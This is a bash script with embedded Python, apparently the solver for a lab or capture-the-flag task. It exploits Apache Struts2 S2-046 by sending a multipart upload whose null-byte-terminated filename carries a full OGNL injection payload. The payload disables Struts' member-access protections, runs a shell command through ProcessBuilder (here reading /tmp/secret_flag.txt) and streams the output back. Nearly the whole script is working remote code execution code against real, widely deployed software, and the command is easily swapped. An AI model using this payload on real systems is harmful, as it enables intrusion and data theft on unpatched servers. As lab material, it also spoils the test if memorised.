#!/bin/bash
set -e

URL_BASE="http://struts2:8080"

# Wait for service to be ready
wait_for_service() {
    echo "Waiting for Struts2 to be ready..."
    for i in {1..30}; do
        if curl -s -f "$URL_BASE/" > /dev/null 2>&1; then
            echo "Service is ready"
            return 0
        fi
        sleep 2
    done
    echo "Service failed to become ready"
    return 1
}

wait_for_service

# Exploit S2-046 OGNL injection via file upload filename with null byte terminator
# The filename in Content-Disposition header is evaluated as OGNL expression
# Must use raw socket to send the null byte (\x00) which terminates the filename

python <<'PYTHON_EOF'
import socket
import sys

# OGNL payload to execute command and copy output to HTTP response
# Uses IOUtils.copy to stream command output directly to response
filename = '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'cat /tmp/secret_flag.txt\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00test.txt'

boundary = 'WebKitFormBoundaryXd004BVJN9pBYBL2'
body_lines = [
    f'------{boundary}',
    f'Content-Disposition: form-data; name="upload"; filename="{filename}"',
    'Content-Type: text/plain',
    '',
    'test content',
    f'------{boundary}--'
]
body = '\r\n'.join(body_lines).encode('latin1')

headers = f'''POST /doUpload.action HTTP/1.1
Host: struts2:8080
Content-Type: multipart/form-data; boundary=----{boundary}
Content-Length: {len(body)}

'''.replace('\n', '\r\n').encode('latin1')

try:
    with socket.create_connection(('struts2', 8080), timeout=10) as conn:
        conn.send(headers + body)
        response = conn.recv(102400).decode('latin1', errors='ignore')
        
        # Extract the body (flag is in response body after headers)
        parts = response.split('\r\n\r\n', 1)
        if len(parts) > 1:
            print(parts[1], flush=True)
        else:
            print(response, flush=True)
            
except Exception as e:
    print(f"Error: {e}", file=sys.stderr, flush=True)
    sys.exit(1)
PYTHON_EOF
